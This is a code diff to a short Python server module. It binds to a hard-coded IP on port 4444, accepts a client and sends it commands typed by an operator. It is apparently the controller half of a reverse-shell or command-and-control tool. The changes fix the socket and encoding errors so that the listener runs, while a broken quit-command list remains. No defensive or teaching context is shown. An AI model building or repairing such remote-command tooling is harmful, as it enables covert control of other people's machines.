@@ -8,12 +8,12 @@ Server python module.
 import sys
 import socket
 
-SERVER_IP = ""
+SERVER_IP = "129.21.131.70"
 PORT = 4444
 
 s = socket.socket()
-s.setsockopt(socket.SQL_SOCKET, socket.SO_REUSEADDR, 1)
-s.bind(SERVER_IP, PORT)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind((SERVER_IP, PORT))
 
 
 s.listen(1)
@@ -27,7 +27,7 @@ while True:
     client[0].send('connected' .encode())
     while True:
         cmd = input('>>> ')
-        client[0].send(cmd.encod())
+        client[0].send(cmd.encode())
 
         if cmd.lower() in ['quit' 'exiit', 'q', 'x']:
             break
